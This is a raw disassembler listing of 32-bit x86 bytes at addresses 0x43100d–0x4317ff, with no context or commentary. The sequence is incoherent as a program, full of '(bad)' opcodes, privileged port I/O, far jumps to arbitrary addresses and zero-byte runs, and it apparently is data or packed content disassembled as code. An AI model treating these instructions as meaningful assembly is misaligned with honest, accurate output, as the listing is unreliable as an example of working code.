  43100d:	icebp  
  43100e:	mov    ebx,0x87597518
  431013:	je     0x43108e
  431015:	loop   0x431013
  431017:	test   BYTE PTR [ebp+0x759a7a4f],dh
  43101d:	pop    ecx
  43101e:	dec    BYTE PTR [eax-0x3ff0a048]
  431024:	rcl    DWORD PTR [edx-0x210ffc41],cl
  43102a:	dec    DWORD PTR [edx]
  43102c:	add    BYTE PTR [esp+edi*2-0x4abbaebc],bl
  431033:	push   es
  431034:	dec    ebx
  431035:	xor    eax,0xbf87
  43103a:	add    BYTE PTR [eax],al
  43103c:	add    cl,cl
  43103e:	or     bl,dl
  431040:	add    ecx,ebp
  431042:	push   edi
  431043:	retf   0x753f
  431046:	ret    
  431047:	cmp    al,0xff
  431049:	sub    bl,BYTE PTR [ebp+ecx*2+0x31]
  43104d:	or     eax,0x1af8d203
  431052:	inc    esi
  431053:	fs inc esp
  431055:	xchg   BYTE PTR [eax-0x2df00c02],ch
  43105b:	(bad)  
  43105d:	cmp    al,BYTE PTR [ebx]
  43105f:	jmp    0x91500e67
  431064:	out    dx,al
  431065:	mov    DWORD PTR [edx],eax
  431067:	jmp    0x24123af3
  43106c:	fidiv  WORD PTR [esi+0x77]
  43106f:	stos   DWORD PTR es:[edi],eax
  431070:	dec    edi
  431071:	sub    bl,dl
  431073:	cs add al,0x75
  431076:	add    dl,BYTE PTR [edx+0x1a]
  431079:	(bad)  
  43107b:	repz add esi,DWORD PTR [ebp+0x7e]
  43107f:	sub    al,bl
  431081:	(bad)  
  431082:	ja     0x4310e7
  431084:	pushf  
  431085:	lods   al,BYTE PTR ds:[esi]
  431086:	inc    ebp
  431087:	xor    DWORD PTR [edi+ebp*4+0x62f63cef],esi
  43108e:	add    bh,BYTE PTR [ecx+0x1a9af180]
  431094:	push   ebx
  431095:	(bad)  
  431096:	mov    dl,0x80
  431098:	mov    al,BYTE PTR ds:[ebp-0x18]
  43109c:	push   edx
  43109d:	inc    esp
  43109e:	pop    edx
  43109f:	and    eax,edi
  4310a1:	add    BYTE PTR [eax],al
  4310a3:	add    BYTE PTR [eax],al
  4310a5:	add    BYTE PTR [edx+0x45],bh
  4310a8:	fs inc esp
  4310aa:	out    0xf8,al
  4310ac:	pop    ebp
  4310ad:	leave  
  4310ae:	jp     0x4310ec
  4310b0:	call   0xce4635b9
  4310b5:	clc    
  4310b6:	repz or esp,DWORD PTR [ecx+ebx*2-0x3a]
  4310bb:	not    ecx
  4310bd:	sbb    DWORD PTR [ebp-0x3b],ebx
  4310c0:	mov    ss,WORD PTR [eax+0x3f]
  4310c3:	lods   al,BYTE PTR ds:[esi]
  4310c4:	ror    ah,1
  4310c6:	add    BYTE PTR [edi-0x47],al
  4310c9:	adc    eax,0x16ffa535
  4310ce:	fidivr DWORD PTR [ecx]
  4310d0:	mov    ebp,0x86b076dd
  4310d5:	cwde   
  4310d6:	fistp  QWORD PTR [ebx+0x79]
  4310d9:	in     eax,0xbf
  4310db:	add    ebp,DWORD PTR [eax]
  4310dd:	ss inc bp
  4310e0:	or     DWORD PTR [esi-0x410509d6],0xffffff9e
  4310e7:	lods   eax,DWORD PTR ds:[esi]
  4310e8:	mov    ch,0x7c
  4310ea:	inc    edi
  4310eb:	mov    al,0xe7
  4310ed:	sbb    edi,ebx
  4310ef:	inc    ebp
  4310f0:	cli    
  4310f1:	ja     0x4310ad
  4310f3:	and    BYTE PTR [eax+ebp*8],cl
  4310f6:	das    
  4310f7:	add    eax,DWORD PTR [eax+0x6e44b66e]
  4310fd:	out    dx,eax
  4310fe:	or     al,0x5d
  431100:	cmp    dl,BYTE PTR [ebx+0x725a4825]
  431106:	sub    al,0xab
  431108:	mov    ebp,0xe5
  43110d:	add    BYTE PTR [eax],al
  43110f:	jbe    0x43109b
  431111:	cwde   
  431112:	mov    bh,bh
  431114:	ret    
  431115:	mov    esi,0x7e592394
  43111a:	or     eax,0x85ebc42e
  43111f:	retf   
  431120:	mov    dl,0x52
  431122:	bound  edi,QWORD PTR [ecx]
  431124:	adc    al,0xc0
  431126:	pop    esp
  431127:	stos   BYTE PTR es:[edi],al
  431128:	and    BYTE PTR [eax+0x70],al
  43112b:	stos   BYTE PTR es:[edi],al
  43112c:	and    BYTE PTR [ecx+edx*1],cl
  43112f:	push   esp
  431130:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431131:	stc    
  431132:	imul   al
  431134:	rol    BYTE PTR [ebx],1
  431136:	pop    esp
  431137:	cmp    ah,BYTE PTR [eax]
  431139:	sbb    al,0x70
  43113b:	sub    eax,0xb91a3c20
  431140:	adc    al,0xd7
  431142:	scas   al,BYTE PTR es:[edi]
  431143:	cmp    eax,0xf4151c20
  431148:	add    eax,DWORD PTR [eax]
  43114a:	add    BYTE PTR [ebx],cl
  43114c:	cmp    ebx,DWORD PTR [esi]
  43114e:	sub    al,0x40
  431150:	sub    edi,DWORD PTR [edx]
  431152:	add    BYTE PTR [edx+0x48243ec7],bh
  431158:	leave  
  431159:	push   esi
  43115a:	and    al,0x74
  43115c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43115d:	stos   DWORD PTR es:[edi],eax
  43115e:	add    BYTE PTR [eax+eax*1],bl
  431161:	jnp    0x4311e2
  431163:	adc    BYTE PTR [eax+0x5],dl
  431166:	xchg   BYTE PTR [esi+0x5afffffe],al
  43116c:	vpsubsb ymm6,ymm2,YMMWORD PTR [ebx]
  431170:	dec    ebp
  431171:	cli    
  431172:	inc    DWORD PTR [eax]
  431174:	add    BYTE PTR [eax],al
  431176:	add    BYTE PTR [eax],al
  431178:	push   edi
  431179:	push   ss
  43117a:	test   bl,bl
  43117c:	ret    
  43117d:	jnp    0x4310ff
  43117f:	add    ah,cl
  431181:	dec    DWORD PTR [edx-0x18]
  431184:	push   0x5ffff6f1
  431189:	inc    edx
  43118a:	push   ds
  43118b:	and    al,0x33
  43118d:	pop    eax
  43118e:	xchg   DWORD PTR [eax+ebp*2+0x1e],eax
  431192:	mov    DWORD PTR [eax+edi*2-0x1a],ebx
  431196:	pop    ebp
  431197:	test   DWORD PTR [ebx+ebp*1+0x53],ebx
  43119b:	mov    ebx,ebx
  43119d:	inc    ebx
  43119e:	mov    ecx,DWORD PTR [ebx-0x64]
  4311a1:	nop
  4311a2:	jns    0x43118c
  4311a4:	mov    WORD PTR [edi],fs
  4311a6:	out    0xfd,eax
  4311a8:	pushf  
  4311a9:	jmp    edi
  4311ab:	call   0x7c7c:0x8bf5b34f
  4311b2:	lock jne 0x431215
  4311b5:	ja     0x43113c
  4311b7:	add    BYTE PTR [edi+edi*8+0x5d],bl
  4311bb:	mov    DWORD PTR [eax],ebx
  4311bd:	sbb    esp,DWORD PTR [eax]
  4311bf:	jmp    0x431144
  4311c1:	ret    
  4311c2:	ds and al,0x78
  4311c5:	mov    cs,WORD PTR [ebx-0x140a8abc]
  4311cb:	dec    edi
  4311cc:	out    dx,al
  4311cd:	call   0x514f:0x3c79d956
  4311d4:	fwait
  4311d5:	rol    dl,cl
  4311d7:	and    edx,DWORD PTR [ecx+0x41]
  4311da:	int    0xb8
  4311dc:	add    BYTE PTR [eax],al
  4311de:	add    BYTE PTR [eax],al
  4311e0:	add    BYTE PTR [eax],ah
  4311e2:	xchg   esp,eax
  4311e3:	jnp    0x431230
  4311e5:	push   ecx
  4311e6:	add    DWORD PTR [ebx+0x7b5089c8],eax
  4311ec:	add    BYTE PTR [edi-0x9f0b0a6],bl
  4311f2:	cld    
  4311f3:	daa    
  4311f4:	sbb    BYTE PTR [ebp-0x11],dh
  4311f7:	add    esp,DWORD PTR [esi+0x74]
  4311fa:	(bad)  
  4311fb:	ret    0x3d23
  4311fe:	jmp    0x91dc857d
  431203:	push   esi
  431204:	jmp    DWORD PTR [ebp-0x22b1b025]
  43120a:	call   0x862c:0xe7cafc85
  431211:	cmp    ebp,edi
  431213:	inc    DWORD PTR [esi-0x3d84aabb]
  431219:	(bad)  
  43121a:	adc    dl,BYTE PTR [edi+0x3b]
  43121d:	sbb    DWORD PTR [ecx-0x2],0x4b4f9d86
  431224:	or     dh,al
  431226:	xchg   esi,eax
  431227:	dec    edi
  431228:	cli    
  431229:	xchg   edx,eax
  43122a:	jmp    0x58d2:0x496123c2
  431231:	lock pushf 
  431233:	and    cl,BYTE PTR [eiz*1-0x7adc552e]
  43123a:	adc    ecx,DWORD PTR [eax]
  43123c:	test   eax,0xbf81396a
  431241:	jmp    0xc368b5
  431246:	add    BYTE PTR [eax],al
  431248:	add    BYTE PTR [eax],al
  43124a:	or     DWORD PTR [ebx],eax
  43124c:	loop   0x43129d
  43124e:	ror    DWORD PTR [edx+0x8],cl
  431251:	jge    0x431209
  431253:	out    0xf8,al
  431255:	xor    BYTE PTR [esi-0x2f4c071a],0x3
  43125c:	dec    edi
  43125d:	or     ch,cl
  43125f:	sub    ch,ch
  431261:	cdq    
  431262:	das    
  431263:	inc    edx
  431264:	mov    cl,0xd8
  431266:	push   esi
  431267:	push   cs
  431268:	rol    DWORD PTR [esi],0xdb
  43126b:	aas    
  43126c:	mov    eax,ds:0xabda8183
  431271:	ret    
  431272:	or     dl,BYTE PTR [edx]
  431274:	add    DWORD PTR [esi*2+0x66da6902],eax
  43127b:	mov    esp,DWORD PTR [eax+ebp*1]
  43127e:	mov    DWORD PTR [ecx-0x2d],eax
  431281:	cmp    edi,DWORD PTR [ebx-0x3e]
  431284:	call   0xdd297909
  431289:	pop    ebx
  43128a:	or     al,0x6b
  43128c:	popa   
  43128d:	dec    edi
  43128e:	fcmovne st,st(7)
  431290:	push   edx
  431291:	enter  0x1696,0xe1
  431295:	xlat   BYTE PTR ds:[ebx]
  431296:	jns    0x4312c2
  431298:	jo     0x431314
  43129a:	mov    edi,0x56c83a41
  43129f:	push   ss
  4312a0:	out    0xd7,al
  4312a2:	push   esp
  4312a3:	stos   BYTE PTR es:[edi],al
  4312a4:	pusha  
  4312a5:	retf   0x262
  4312a8:	inc    ecx
  4312a9:	imul   ecx,DWORD PTR [eax+0x7b2140],0x0
  4312b3:	ss out 0xf4,al
  4312b6:	fisttp DWORD PTR [edx-0x5a7c17bf]
  4312bc:	sub    ah,BYTE PTR [ebp+0x64]
  4312bf:	jne    0x431293
  4312c1:	mov    es,WORD PTR [edx+eax*8]
  4312c4:	aad    0x95
  4312c6:	dec    esi
  4312c7:	and    DWORD PTR [esi+0x4136d8ff],0xc5c0d5e5
  4312d1:	and    edi,ebp
  4312d3:	jp     0x43128b
  4312d5:	or     al,0x51
  4312d7:	jno    0x4312db
  4312d9:	add    BYTE PTR [ecx+0x1c],ch
  4312dc:	adc    eax,0x107ef4fb
  4312e1:	inc    eax
  4312e2:	jmp    0xe166e096
  4312e7:	jg     0x431332
  4312e9:	jae    0x4312ce
  4312eb:	lahf   
  4312ec:	add    ah,BYTE PTR [esi-0x18]
  4312ef:	stos   DWORD PTR es:[edi],eax
  4312f0:	adc    DWORD PTR [ecx-0x72e5a2bb],ecx
  4312f6:	and    eax,0xae4fda5d
  4312fb:	cmp    ah,ch
  4312fd:	das    
  4312fe:	test   DWORD PTR [edx],esp
  431300:	add    DWORD PTR [eax],eax
  431302:	scas   al,BYTE PTR es:[edi]
  431303:	mov    edx,0x28511fe4
  431308:	add    DWORD PTR [eax],eax
  43130a:	jbe    0x4312e9
  43130c:	adc    BYTE PTR [edi],cl
  43130e:	sub    DWORD PTR [ecx-0x23],esi
  431311:	pop    ecx
  431312:	ret    0x264f
  431315:	pop    esp
  431316:	sub    al,BYTE PTR [eax]
  431318:	add    BYTE PTR [eax],al
  43131a:	add    BYTE PTR [eax],al
  43131c:	and    ch,al
  43131e:	and    ebp,ebp
  431320:	jns    0x4312f6
  431322:	xchg   BYTE PTR [eax+0x33],bl
  431325:	add    ebp,DWORD PTR [eax+0x6e40b6b7]
  43132b:	out    0xe0,eax
  43132d:	sub    BYTE PTR [esi],ch
  43132f:	jno    0x431376
  431331:	cmp    al,0x86
  431333:	daa    
  431334:	enter  0x37e,0xe9
  431338:	(bad)  
  431339:	rol    BYTE PTR [esi-0x40103ce7],cl
  43133f:	bound  eax,QWORD PTR [eax-0x10]
  431342:	(bad)  
  431343:	fisubr DWORD PTR [ebx]
  431345:	sub    DWORD PTR [esi],ebx
  431347:	add    BYTE PTR [edi+0x4],cl
  43134a:	add    BYTE PTR [ebx],bh
  43134c:	lahf   
  43134d:	push   edi
  43134e:	or     cl,BYTE PTR [ebx+0x17e2489a]
  431354:	aas    
  431355:	add    al,0x0
  431357:	cmp    ebx,DWORD PTR [edi]
  431359:	pop    eax
  43135a:	out    dx,al
  43135b:	cmp    edx,DWORD PTR [edi+0x58]
  43135e:	(bad)  
  43135f:	scas   eax,DWORD PTR es:[edi]
  431360:	dec    ebp
  431361:	fstp   TBYTE PTR [ebx-0x75]
  431364:	push   edx
  431365:	iret   
  431366:	push   0x14
  431368:	mov    esi,ds
  43136a:	pusha  
  43136b:	mov    eax,0xf081cde9
  431370:	daa    
  431371:	shr    DWORD PTR [esi+0x27],cl
  431374:	mov    dh,0xa
  431376:	call   0xf612c746
  43137b:	cmp    ebx,edi
  43137d:	pop    edx
  43137e:	dec    BYTE PTR [eax+0x0]
  431384:	add    BYTE PTR [ebx+ebx*8],al
  431387:	cld    
  431388:	xor    cl,ah
  43138a:	or     DWORD PTR [ebx+0x2abce274],edi
  431390:	mov    esi,esp
  431392:	fld    DWORD PTR [edx]
  431394:	push   esi
  431395:	hlt    
  431396:	rep lods eax,DWORD PTR ds:[esi]
  431398:	std    
  431399:	dec    ebx
  43139a:	adc    edi,esi
  43139c:	cmp    edx,DWORD PTR [edi+0x57]
  43139f:	(bad)  
  4313a0:	xor    DWORD PTR [ecx+ebx*8-0x242b95c1],ebx
  4313a7:	call   0xf0c3:0x31cd29b7
  4313ae:	cmp    bh,BYTE PTR [ebp+0x3abd8400]
  4313b4:	add    BYTE PTR ds:0x8eeafe4e,dl
  4313ba:	adc    al,al
  4313bc:	cmp    ebx,DWORD PTR [edi+0x57]
  4313bf:	add    eax,0x9edba3ff
  4313c4:	mov    bh,0x75
  4313c6:	push   ss
  4313c7:	dec    ebp
  4313c8:	push   edx
  4313c9:	lea    ebp,[edi+0x1472fc94]
  4313cf:	das    
  4313d0:	xchg   BYTE PTR [ebp+0x11],ah
  4313d3:	mov    bl,0x10
  4313d5:	jne    0x431400
  4313d7:	pop    es
  4313d8:	mov    edi,0xaeae22e1
  4313dd:	je     0x431407
  4313df:	icebp  
  4313e0:	or     esp,DWORD PTR [esi-0x17]
  4313e3:	add    eax,DWORD PTR [esi+0x56a9f836]
  4313e9:	add    BYTE PTR [eax],al
  4313eb:	add    BYTE PTR [eax],al
  4313ed:	add    BYTE PTR [esi],dh
  4313ef:	lods   al,BYTE PTR ds:[esi]
  4313f0:	retf   0x7923
  4313f3:	sub    esi,DWORD PTR [esi+eax*4+0x7943024]
  4313fa:	test   al,0x5
  4313fc:	cmp    eax,0x7eeff56f
  431402:	or     al,0x36
  431404:	rcr    DWORD PTR [ebx+edi*4+0x24],1
  431408:	inc    esp
  431409:	outs   dx,BYTE PTR ds:[esi]
  43140a:	outs   dx,BYTE PTR ds:[esi]
  43140b:	test   eax,0x166f00c6
  431410:	add    esp,DWORD PTR [esi+0x77]
  431413:	loope  0x43146d
  431415:	(bad)  
  431416:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431417:	imul   edi,DWORD PTR [esi+0x4847788],0xfe2a77c3
  431421:	push   DWORD PTR [ebp+0x1c]
  431424:	inc    esp
  431425:	aas    
  431426:	ficomp WORD PTR ds:0x556ff881
  43142c:	adc    al,0x7f
  43142e:	mov    esp,0xf6e6cc5c
  431433:	sar    ecx,0x73
  431436:	mov    edx,0x758445a9
  43143b:	sub    esi,edi
  43143d:	jae    0x4314bc
  43143f:	stos   BYTE PTR es:[edi],al
  431440:	inc    ebp
  431441:	and    dl,BYTE PTR [ebp+0x2]
  431444:	jmp    0x6861234c
  431449:	dec    edx
  43144a:	dec    ebp
  43144b:	loop   0x431435
  43144d:	add    edi,esi
  43144f:	adc    eax,0x122
  431454:	add    BYTE PTR [eax],al
  431456:	add    BYTE PTR [edx+0x3e],dh
  431459:	call   0xb5926661
  43145e:	inc    ebx
  43145f:	popf   
  431460:	(bad)  
  431461:	int3   
  431462:	jmp    FWORD PTR [edi-0x69]
  431465:	sub    bl,al
  431467:	pop    ebx
  431468:	jne    0x43147f
  43146a:	inc    esp
  43146b:	lods   al,BYTE PTR ds:[esi]
  43146c:	inc    eax
  43146d:	lock add ebp,DWORD PTR [ebp+0x71205481]
  431474:	add    dl,bl
  431476:	xchg   ecx,eax
  431477:	jp     0x431430
  431479:	fadd   QWORD PTR [esi-0x48caf6d3]
  43147f:	push   ebx
  431480:	inc    edx
  431481:	gs dec ebp
  431483:	imul   esi,DWORD PTR [edi+0x3104343],0x297503e9
  43148d:	cmp    al,0x87
  43148f:	std    
  431490:	or     BYTE PTR ds:0x65fb7f0b,bl
  431496:	dec    ebp
  431497:	cmp    DWORD PTR [esp+edx*8-0x1778127c],0xd0b67503
  4314a2:	test   ch,bl
  4314a4:	in     eax,0xc8
  4314a6:	add    esi,DWORD PTR [ebp-0x44]
  4314a9:	or     al,0x85
  4314ab:	int    0xeb
  4314ad:	or     BYTE PTR [esi*2-0x47bd0b43],al
  4314b4:	add    cl,ch
  4314b6:	add    esi,DWORD PTR [ebp+0x29]
  4314b9:	adc    dl,BYTE PTR [edi]
  4314bb:	add    BYTE PTR [eax],al
  4314bd:	add    BYTE PTR [eax],al
  4314bf:	add    BYTE PTR [ebp+0x711fa4fb],dh
  4314c5:	or     eax,0xfd315c00
  4314ca:	out    0x9,al
  4314cc:	ss aas 
  4314ce:	(bad)  
  4314cf:	call   0x42a174a
  4314d4:	push   0x42
  4314d6:	out    0xf0,al
  4314d8:	imul   eax,esi,0x23
  4314db:	loope  0x431521
  4314dd:	add    al,0x80
  4314df:	cmp    DWORD PTR [edi+0x40e4750e],0x7202523f
  4314e9:	in     eax,dx
  4314ea:	mov    edi,0x2d3fd1a9
  4314ef:	test   eax,0xe90b7f36
  4314f4:	ret    
  4314f5:	cmp    eax,0xb1afd17d
  4314fa:	push   es
  4314fb:	fs mov dh,0xb1
  4314fe:	add    bl,BYTE PTR [ecx]
  431500:	mov    esi,0x36da0c16
  431505:	cmp    eax,0x299a1cbd
  43150a:	jle    0x4314d1
  43150c:	mov    esi,0xc3f5ebbc
  431511:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431512:	push   DWORD PTR [ecx+0x4e]
  431515:	test   BYTE PTR [ecx+esi*8+0x55],al
  431519:	cmp    edx,edi
  43151b:	push   cs
  43151c:	ds int 0xfa
  43151f:	cld    
  431520:	fisub  DWORD PTR [esi+0x7dff]
  431526:	add    BYTE PTR [eax],al
  431528:	add    ch,al
  43152a:	or     al,0xfb
  43152c:	cld    
  43152d:	loop   0x431566
  43152f:	je     0x431512
  431531:	aas    
  431532:	push   ss
  431533:	jo     0x431530
  431535:	mov    dh,0x3c
  431537:	jge    0x43159a
  431539:	das    
  43153a:	mov    dh,0x3
  43153c:	sbb    esi,DWORD PTR [ecx]
  43153e:	and    al,0x24
  431540:	push   esi
  431541:	mov    ch,0x14
  431543:	add    BYTE PTR [eax],al
  431545:	pushf  
  431546:	cmp    dl,0x88
  431549:	(bad)  
  43154a:	dec    esp
  43154b:	adc    al,BYTE PTR [ebx-0xf7e330]
  431551:	pop    ds
  431552:	jne    0x431572
  431554:	or     al,0x53
  431556:	mov    edx,0x7084243e
  43155b:	dec    edx
  43155c:	push   eax
  43155d:	test   BYTE PTR [eax],0xe8
  431560:	jmp    0x6d5d:0xb000005e
  431567:	and    ebp,0xec601
  43156d:	stc    
  43156e:	mov    esp,0xbaed51e6
  431573:	inc    ebx
  431574:	clc    
  431575:	mov    WORD PTR [ebp+0x17230843],?
  43157b:	not    DWORD PTR ds:0x3a2fa4
  431581:	cdq    
  431582:	(bad)  
  431583:	jae    0x431589
  431585:	cs shl cl,0xd
  431589:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43158a:	jnp    0x43157e
  43158c:	mov    DWORD PTR [eax],eax
  43158e:	add    BYTE PTR [eax],al
  431590:	add    BYTE PTR [eax],al
  431592:	or     bh,BYTE PTR [edi+0x4095fc43]
  431598:	(bad)  
  431599:	scas   eax,DWORD PTR es:[edi]
  43159a:	sbb    eax,0xc04bcf9
  43159f:	ins    DWORD PTR es:[edi],dx
  4315a0:	sub    esp,0x830ada8f
  4315a6:	jns    0x43157a
  4315a8:	cli    
  4315a9:	push   esi
  4315aa:	das    
  4315ab:	shl    BYTE PTR [ecx+eax*1+0x51],0x43
  4315b0:	repnz stos DWORD PTR es:[edi],eax
  4315b2:	push   ecx
  4315b3:	jnp    0x4315a3
  4315b5:	push   eax
  4315b6:	arpl   WORD PTR [ebx-0xe],cx
  4315b9:	mov    ebx,DWORD PTR [ecx]
  4315bb:	cmp    ch,dh
  4315bd:	jne    0x4315e7
  4315bf:	leave  
  4315c0:	sub    bh,bh
  4315c2:	jne    0x431602
  4315c4:	push   edx
  4315c5:	adc    BYTE PTR ds:0x20bf7929,dh
  4315cb:	sub    eax,0x2e8ec014
  4315d0:	jnp    0x431616
  4315d2:	mov    eax,ds:0x3886fda2
  4315d7:	icebp  
  4315d8:	jbe    0x43161b
  4315da:	jno    0x4315b5
  4315dc:	(bad)  
  4315dd:	pop    edx
  4315de:	lods   al,BYTE PTR ds:[esi]
  4315df:	out    0xff,eax
  4315e1:	(bad)  
  4315e2:	jp     0x431581
  4315e4:	sbb    cl,BYTE PTR [edi+ebx*8]
  4315e7:	sub    DWORD PTR [edi+0x73],eax
  4315ea:	xchg   ecx,eax
  4315eb:	pop    ecx
  4315ec:	inc    edi
  4315ed:	jae    0x431588
  4315ef:	pop    ecx
  4315f0:	inc    edi
  4315f1:	das    
  4315f2:	pop    edx
  4315f3:	pop    esi
  4315f4:	push   edx
  4315f5:	adc    BYTE PTR [eax],al
  4315f7:	add    BYTE PTR [eax],al
  4315f9:	add    BYTE PTR [eax],al
  4315fb:	mov    ch,0x29
  4315fd:	dec    edi
  4315fe:	xlat   BYTE PTR ds:[ebx]
  4315ff:	outs   dx,BYTE PTR ds:[esi]
  431600:	imul   ecx,DWORD PTR [edi-0x29],0x54fe2d37
  431607:	out    dx,al
  431608:	inc    esp
  431609:	fdiv   st(7),st
  43160b:	add    esi,esp
  43160d:	repz dec edi
  43160f:	sub    bh,dh
  431611:	xrelease xchg BYTE PTR [eax+0x69744731],bh
  431618:	je     0x431628
  43161a:	sti    
  43161b:	push   0x753feef9
  431620:	scas   al,BYTE PTR es:[edi]
  431621:	ds je  0x43169c
  431624:	test   al,0x36
  431626:	cli    
  431627:	push   cs
  431628:	sub    BYTE PTR [ebx+0x44],bh
  43162b:	test   esi,ebp
  43162d:	inc    ecx
  43162e:	or     esi,DWORD PTR [ebp+0x18]
  431631:	adc    eax,0x765e9dd7
  431636:	aam    0x36
  431638:	sub    ecx,ecx
  43163a:	xor    DWORD PTR [ebx],ebp
  43163c:	jmp    0x431674
  43163e:	aam    0x36
  431640:	add    ch,cl
  431642:	mov    cl,0xbf
  431644:	adc    al,0xf5
  431646:	hlt    
  431647:	jp     0x43164b
  431649:	adc    edi,esp
  43164b:	cli    
  43164c:	push   esp
  43164d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43164e:	add    esp,DWORD PTR [eax]
  431650:	sbb    DWORD PTR [eax-0x1a],esi
  431653:	jp     0x43167a
  431655:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431656:	add    ebp,esp
  431658:	sbb    al,0xed
  43165a:	pop    esi
  43165b:	push   ebx
  43165c:	add    ah,BYTE PTR [eax-0x1a]
  43165f:	add    BYTE PTR [eax],al
  431661:	add    BYTE PTR [eax],al
  431663:	add    dh,bh
  431665:	push   esp
  431666:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431667:	add    esi,DWORD PTR [edi+0x3b2e7104]
  43166d:	add    ch,al
  43166f:	mov    cl,0x6f
  431671:	adc    cl,dh
  431673:	hlt    
  431674:	stos   BYTE PTR es:[edi],al
  431675:	add    ah,BYTE PTR [ebx-0x5ae0895e]
  43167b:	add    esp,DWORD PTR [edx-0x22e484bb]
  431681:	xchg   esi,eax
  431682:	jno    0x431647
  431684:	dec    edx
  431685:	cmp    ebx,edi
  431687:	aas    
  431688:	jo     0x43164c
  43168a:	call   0xfbf21099
  43168f:	(bad)  [edx-0x77]
  431692:	sub    BYTE PTR [eax*8+0x7043db39],al
  431699:	ret    0xa2e8
  43169c:	jbe    0x4316bd
  43169e:	and    eax,0x33454a04
  4316a3:	add    BYTE PTR [ebx+0x42],bl
  4316a6:	(bad)  
  4316a7:	icebp  
  4316a8:	sti    
  4316a9:	mov    ah,0xfb
  4316ac:	nop
  4316ad:	jmp    0x4736:0x1296d091
  4316b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4316b5:	cmp    DWORD PTR [eax-0x56e235b1],ebx
  4316bb:	dec    edi
  4316bc:	ret    0xffdd
  4316bf:	stos   BYTE PTR es:[edi],al
  4316c0:	sar    DWORD PTR [ecx],1
  4316c2:	dec    ebp
  4316c3:	mov    edx,0x711cf19f
  4316c8:	add    BYTE PTR [eax],al
  4316ca:	add    BYTE PTR [eax],al
  4316cc:	add    BYTE PTR [eax+edi*8-0x2b972c01],al
  4316d3:	mov    ecx,0xfff86421
  4316d8:	mov    dh,0x33
  4316da:	push   cs
  4316db:	adc    al,0xda
  4316dd:	mov    dh,0x39
  4316df:	xor    bl,ah
  4316e1:	push   ds
  4316e2:	dec    esi
  4316e3:	ds jmp 0xcccc318e
  4316e9:	mov    ds,WORD PTR [esi]
  4316eb:	ds jmp 0x4472cf2
  4316f1:	mov    dh,0x39
  4316f3:	xchg   esp,esi
  4316f5:	jmp    0x87fe:0xa8e93e4e
  4316fc:	sbb    al,0x36
  4316fe:	cmp    edi,edi
  431700:	xchg   esi,eax
  431701:	mov    bl,0xe
  431703:	sbb    dl,bl
  431705:	cmp    DWORD PTR ss:[eax+ecx*2+0x49],ebx
  43170a:	push   ds
  43170b:	ds jmp 0x11b79080
  431711:	sbb    DWORD PTR [ebp+0x3d792972],ebx
  431717:	adc    al,0xa5
  431719:	and    al,0xf9
  43171b:	inc    DWORD PTR [ecx]
  43171d:	mov    dh,0xb5
  43171f:	adc    al,0x51
  431721:	adc    DWORD PTR [edi+edi*1+0x143bc6e9],ecx
  431728:	test   eax,0x49fff904
  43172d:	(bad)  
  43172e:	sbb    eax,0xe93e
  431733:	add    BYTE PTR [eax],al
  431735:	add    BYTE PTR [edi+0x79],ch
  431738:	je     0x431727
  43173a:	test   BYTE PTR [edx-0x1a],al
  43173d:	hlt    
  43173e:	outs   dx,DWORD PTR ds:[esi]
  43173f:	int    0x23
  431741:	add    ah,ah
  431743:	pop    edx
  431744:	and    bh,bh
  431746:	loopne 0x431760
  431748:	adc    BYTE PTR [ebx+0x4b],dl
  43174b:	push   cs
  43174c:	not    eax
  43174e:	inc    ebx
  43174f:	in     eax,dx
  431750:	adc    eax,eax
  431752:	and    ebp,ebp
  431754:	push   ecx
  431755:	ret    0x4c4
  431758:	push   ebp
  431759:	mov    edi,DWORD PTR [eax]
  43175b:	test   dh,ah
  43175d:	sub    al,0xe2
  43175f:	cmp    DWORD PTR [di-0x44],0x5b85eabb
  431767:	dec    ecx
  431768:	arpl   ax,bp
  43176a:	mov    ah,BYTE PTR [edx+0x3898fff8]
  431770:	ins    BYTE PTR es:[edi],dx
  431771:	pop    esp
  431772:	or     DWORD PTR [edx-0x32],eax
  431775:	push   eax
  431776:	ret    0xc0dc
  431779:	dec    BYTE PTR [ebx+0x1c07ec0]
  43177f:	cmp    BYTE PTR [eax+eax*8],ch
  431782:	xchg   DWORD PTR [ecx+edi*2+0x7d],ecx
  431786:	fs add al,0x83
  431789:	xor    eax,0x3a2608
  43178e:	idiv   BYTE PTR [ebx]
  431790:	push   ebp
  431791:	je     0x4317dc
  431793:	mov    eax,DWORD PTR [di+0x0]
  431797:	outs   dx,DWORD PTR ds:[esi]
  431798:	cmc    
  431799:	jne    0x43179b
  43179b:	add    BYTE PTR [eax],al
  43179d:	add    BYTE PTR [eax],al
  43179f:	adc    al,0xbf
  4317a1:	rol    BYTE PTR [ebx+0x7d793ad0],1
  4317a7:	sub    BYTE PTR [esp+esi*2],al
  4317aa:	or     eax,0xdc43af83
  4317af:	ins    BYTE PTR es:[edi],dx
  4317b0:	mov    ebp,0xe8db0c73
  4317b5:	jns    0x43177b
  4317b7:	or     BYTE PTR [ecx+0x670774d1],bh
  4317bd:	mov    eax,DWORD PTR [ebp+0x75]
  4317c0:	test   DWORD PTR [ebx-0x7f9015b2],esi
  4317c6:	ret    
  4317c7:	jno    0x4317e1
  4317c9:	jae    0x43180f
  4317cb:	leave  
  4317cc:	sbb    DWORD PTR [ebp+0x74],eax
  4317cf:	gs mov al,0x29
  4317d2:	out    0x99,al
  4317d4:	sahf   
  4317d5:	sub    BYTE PTR [esi-0x4146cf46],al
  4317db:	and    eax,0xb20bcad8
  4317e0:	push   esi
  4317e1:	idiv   dl
  4317e3:	arpl   ax,cx
  4317e5:	jmp    0xb584:0xfe6984f3
  4317ec:	ins    DWORD PTR es:[edi],dx
  4317ed:	data16 test BYTE PTR [edx-0x517b128b],dl
  4317f4:	ins    DWORD PTR es:[edi],dx
  4317f5:	icebp  
  4317f6:	gs ins DWORD PTR es:[edi],dx
  4317f8:	jl     0x4317a5
  4317fa:	cli    
  4317fb:	pusha  
  4317fc:	push   ebp
  4317fd:	in     al,dx
  4317fe:	aas    
  4317ff:	jne    0x4317ad
